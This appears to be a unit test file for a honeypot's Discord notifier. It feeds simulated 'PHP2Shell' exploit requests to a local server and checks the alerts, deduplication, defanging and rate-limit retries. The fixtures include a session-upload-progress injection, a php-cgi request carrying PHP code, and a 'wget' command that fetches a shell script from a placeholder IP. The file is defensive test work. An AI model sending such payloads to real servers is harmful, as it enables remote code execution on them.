"""Discord notifier tests (python -m unittest discover -s tests)."""

import http.server
import json
import os
import unittest

from helpers import (
    FORM_URLENCODED,
    QuietHandler,
    ServerTestCase,
    multipart_body,
    multipart_headers,
    serve_in_background,
)


class FakeWebhook(QuietHandler):
    """Stub Discord webhook that records posts and can rate-limit."""

    posts: list = []
    rate_limit_next = False

    def do_POST(self):  # pylint: disable=invalid-name  # stdlib API name
        """Record the JSON payload or answer once with HTTP 429."""
        body = self.rfile.read(int(self.headers["Content-Length"]))
        if FakeWebhook.rate_limit_next:
            FakeWebhook.rate_limit_next = False
            data = b'{"retry_after": 0.1}'
            self.send_response(429)
        else:
            FakeWebhook.posts.append(json.loads(body))
            data = b""
            self.send_response(204)
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


class DiscordNotifierTest(ServerTestCase):
    """PHP2Shell exploits are reported to a Discord webhook."""

    log = "attacks"

    @classmethod
    def setUpClass(cls):
        """Start the stub webhook and a server configured to use it."""
        cls.hook = http.server.HTTPServer(("127.0.0.1", 0), FakeWebhook)
        serve_in_background(cls.hook)
        hook_port = cls.hook.server_address[1]
        os.environ.update(
            HP_NOTIFIERS="discord",
            HP_DISCORD_WEBHOOK_URL=(
                f"http://127.0.0.1:{hook_port}/api/webhooks/1/x"
            ),
        )
        super().setUpClass()
        for key in ("HP_NOTIFIERS", "HP_DISCORD_WEBHOOK_URL"):
            del os.environ[key]
        cls.srv.notify.notifiers[0].min_interval = 0

    @classmethod
    def tearDownClass(cls):
        """Stop the server and the stub webhook."""
        super().tearDownClass()
        cls.hook.shutdown()

    def setUp(self):
        """Forget posts from earlier tests."""
        FakeWebhook.posts.clear()

    def posts(self):
        """Flush pending notifications and return the received posts."""
        self.srv.notify.flush()
        return FakeWebhook.posts

    def exploit(self, cmd: str, boundary: str = "----p2sHOOK"):
        """Send a PHP2Shell exploit running cmd."""
        body = multipart_body(
            boundary,
            [("PHP_SESSION_UPLOAD_PROGRESS", None, f"x|{cmd}".encode())],
        )
        return self.req(
            "POST", "/upload.php", body, multipart_headers(boundary)
        )

    def test_reports_php2shell_with_commands(self):
        """The report embeds commands, download URLs and indicators."""
        self.req("GET", "/")
        self.exploit("wget http://203.0.113.7/x.sh; id")
        posts = self.posts()
        self.assertEqual(len(posts), 1)
        embed = posts[0]["embeds"][0]
        self.assertEqual(embed["title"], "PHP2Shell exploit")
        values = {f["name"]: f["value"] for f in embed["fields"]}
        self.assertIn("wget http://203.0.113.7/x.sh; id", values["Commands"])
        self.assertIn("http://203.0.113.7/x.sh", values["Download URLs"])
        self.assertIn("php2shell.upload_progress_field", values["Indicators"])
        self.assertEqual(posts[0]["allowed_mentions"], {"parse": []})

    def test_identical_reports_suppressed(self):
        """Repeated identical exploits produce a single report."""
        for _ in range(3):
            self.exploit("echo same")
        self.assertEqual(len(self.posts()), 1)
        self.exploit("echo different")
        self.assertEqual(len(self.posts()), 2)

    def test_other_exploits_not_reported(self):
        """Non-PHP2Shell exploits are not reported."""
        self.req(
            "POST",
            "/php-cgi/php-cgi.exe",
            '<?php echo md5("x"); ?>',
            FORM_URLENCODED,
        )
        self.assertEqual(self.posts(), [])

    def test_attacker_text_is_defanged(self):
        """Attacker text cannot break out of the code block."""
        self.exploit("echo @everyone ```x``` ; id")
        value = next(
            f["value"]
            for f in self.posts()[0]["embeds"][0]["fields"]
            if f["name"] == "Commands"
        )
        self.assertTrue(value.startswith("```\n") and value.endswith("\n```"))
        self.assertEqual(value.count("```"), 2)

    def test_retry_after_rate_limit(self):
        """A 429 response is retried after the advertised delay."""
        FakeWebhook.rate_limit_next = True
        self.exploit("echo ratelimited")
        self.assertEqual(len(self.posts()), 1)


if __name__ == "__main__":
    unittest.main()
